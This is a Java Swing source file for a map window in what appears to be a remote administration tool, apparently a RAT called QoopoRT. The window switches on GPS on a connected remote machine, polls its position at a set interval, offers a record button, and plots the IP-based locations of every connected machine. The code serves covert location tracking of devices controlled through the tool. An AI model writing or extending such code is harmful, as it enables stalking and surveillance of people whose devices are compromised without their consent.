package qooport.modulos;

import comunes.GPSPosicion;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.ObjectInputStream;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.JToggleButton;
import javax.swing.JToolBar;
import javax.swing.SpinnerNumberModel;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import static qooport.avanzado.QoopoRT.tipoLetra;
import qooport.gui.personalizado.MapPanel;
import qooport.utilidades.Util;

public class Mapa extends JFrame
        implements Runnable {

    public boolean conectado;
    public JToolBar barra;
    private JToggleButton btnIniciarDetener;
    private JToggleButton btnGrabar;
    private JLabel lblProveedor;
    private JLabel lblIntervalo;
    private JSpinner seconds;
    private MapPanel mapa;
    private Asociado servidor;
    private boolean pidiendo;
    private boolean yaLlego; //controla que halla llegado la solicitud enviada

    public ObjectInputStream recibirObjeto;
    private JComboBox provedor;
    private JButton btnListarProvedores;
    private JTextField txtIp;
    private JLabel lblIp;

    public Mapa(ObjectInputStream in, Asociado servidor) {
        initComponents(false);
        this.servidor = servidor;
        pidiendo = false;
        yaLlego = true;
        this.recibirObjeto = in;

    }

    public Mapa() {
        initComponents(true);
        pidiendo = false;
    }

    private void initComponents(boolean mapaGlobal) {
        barra = new JToolBar();
        barra.setFloatable(false);
        this.btnIniciarDetener = new JToggleButton();
        this.btnGrabar = new JToggleButton();
        this.lblIntervalo = new JLabel();
        this.seconds = new JSpinner();
        this.provedor = new JComboBox();
        this.btnListarProvedores = new JButton();
        setResizable(true);

        if (mapaGlobal) {
            setTitle("Ubicacion Equipos Conectados");
        } else {
            setTitle("Ubicacion remota ");
            try {
                setTitle("Ubicacion remota [" + servidor.getInformacion() + "]");
            } catch (Exception e) {
            }
        }

        btnListarProvedores.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        btnListarProvedores.setSelected(true);
        btnListarProvedores.setSize(30, 30);
        this.btnListarProvedores.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Mapa.this.btnListarAP(evt);
            }
        });
        btnIniciarDetener.setIcon(Util.cargarIcono16("/resources/start.png"));
        btnIniciarDetener.setSelected(false);
        btnIniciarDetener.setSize(30, 30);
        this.btnIniciarDetener.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Mapa.this.btnIniciarPararAP(evt);
            }
        });
        btnGrabar.setIcon(Util.cargarIcono16("/resources/record_small.png"));
        btnGrabar.setSelected(false);
        btnGrabar.setSize(30, 30);
        btnGrabar.setToolTipText("Grabar");
        this.lblIntervalo.setFont(new Font("Angelina", 0, 14));
        this.lblIntervalo.setText(" Seg. ");
        this.seconds.setModel(new SpinnerNumberModel(1, 1, 20, 0.5));
        this.lblProveedor = new JLabel("Proveedor de Ubicacion:");
        mapa = new MapPanel(mapaGlobal);
        barra.add(this.lblProveedor);
        barra.add(provedor);
        barra.add(btnListarProvedores);
        barra.add(btnIniciarDetener);
        barra.add(btnGrabar);
        barra.addSeparator();
        barra.add(lblIntervalo);
        barra.add(seconds);
        txtIp = new JTextField();
        lblIp = new JLabel();
        lblIp.setText("Buscar IP(s):");
        lblIp.setToolTipText("Ingresar la ip o varias ips separada por ;");
        JButton btnBuscarIp = new JButton();
        btnBuscarIp.setIcon(Util.cargarIcono16("/resources/find.png"));
        btnBuscarIp.setSelected(false);
        btnBuscarIp.setSize(30, 30);
        btnBuscarIp.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Mapa.this.btnBuscarIpAP(evt);
            }
        });

        JButton btnObtenerIpsServidores = new JButton();
        btnObtenerIpsServidores.setToolTipText("Obtener las ips de los equipos conectados actualmente");
        btnObtenerIpsServidores.setText("Equipos");
        btnObtenerIpsServidores.setIcon(Util.cargarIcono16("/resources/find.png"));
        btnObtenerIpsServidores.setSelected(false);
        btnObtenerIpsServidores.setSize(30, 30);
        btnObtenerIpsServidores.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                Mapa.this.btnBuscarIpEquiposAP(evt);
            }
        });
        JPanel panelInferior = new JPanel();
        panelInferior.setBorder(BorderFactory.createTitledBorder(null, "Buscar Ip", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));
        panelInferior.setLayout(new GridLayout(1, 3));
        panelInferior.add(lblIp);
        panelInferior.add(txtIp);
        panelInferior.add(btnBuscarIp);
        panelInferior.add(btnObtenerIpsServidores);
        this.setLayout(new BorderLayout());
        if (!mapaGlobal) {
            this.add(barra, BorderLayout.NORTH);
            this.add(mapa, BorderLayout.CENTER);
            this.add(panelInferior, BorderLayout.SOUTH);
        } else {
            this.add(panelInferior, BorderLayout.NORTH);
            this.add(mapa, BorderLayout.CENTER);
        }

        this.setSize(300, 150);
        this.setResizable(true);
        this.setVisible(true);
        this.setIconImage(Util.cargarIcono16("/resources/map_location.png").getImage());
        pack();
    }

    private void btnListarAP(ActionEvent evt) {
        servidor.listarGPSProveedores();
    }

    private void btnIniciarPararAP(ActionEvent evt) {
        this.pidiendo = !this.pidiendo;
        if (this.pidiendo) {
            this.servidor.activarGPS(this.provedor.getSelectedItem().toString());
            btnIniciarDetener.setIcon(Util.cargarIcono16("/resources/stop_close.png"));
        } else {
            this.servidor.desactivarGPS();
            btnIniciarDetener.setIcon(Util.cargarIcono16("/resources/start.png"));
        }
    }

    private void btnBuscarIpEquiposAP(ActionEvent evt) {
        txtIp.setText("");
        String ips = "";
        getMapa().limpiarMarcadores();
        for (Asociado serv : QoopoRT.SERVIDORES.values()) {
            ips += serv.getIp() + ";";
            GPSPosicion posicion = Util.obtenerPosicionGPS(serv.getIp());
            getMapa().agregarMarcador(posicion.getLongitud(), posicion.getLatitud());
            getMapa().repaint();
        }

        txtIp.setText(ips);
    }

    private void btnBuscarIpAP(ActionEvent evt) {
        String ips[] = txtIp.getText().split(";");
        getMapa().limpiarMarcadores();
        for (String ip : ips) {
            GPSPosicion posicion = Util.obtenerPosicionGPS(ip);
            getMapa().agregarMarcador(posicion.getLongitud(), posicion.getLatitud());
            //posicion.setTime(new Date().getTime());
            //getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
            getMapa().repaint();
        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                Thread.sleep((int) (Float.parseFloat(this.seconds.getValue().toString()) * 1000));
            } catch (InterruptedException ex) {
                Logger.getLogger(Mapa.class.getName()).log(Level.SEVERE, null, ex);
            }
            if (pidiendo) {
                servidor.pedirGPS();
            }
        }
    }

    public boolean isYaLlego() {
        return yaLlego;
    }

    public void setYaLlego(boolean yaLlego) {
        this.yaLlego = yaLlego;
    }

    public ObjectInputStream getRecibirObjeto() {
        return recibirObjeto;
    }

    public void setRecibirObjeto(ObjectInputStream recibirObjeto) {
        this.recibirObjeto = recibirObjeto;
    }

    public MapPanel getMapa() {
        return mapa;
    }

    public void setMapa(MapPanel mapa) {
        this.mapa = mapa;
    }

    public JComboBox getProvedor() {
        return provedor;
    }

    public void setProvedor(JComboBox provedor) {
        this.provedor = provedor;
    }

    public JTextField getTxtIp() {
        return txtIp;
    }

    public void setTxtIp(JTextField txtIp) {
        this.txtIp = txtIp;
    }

    public void buscar() {
        this.btnBuscarIpAP(null);
    }

}
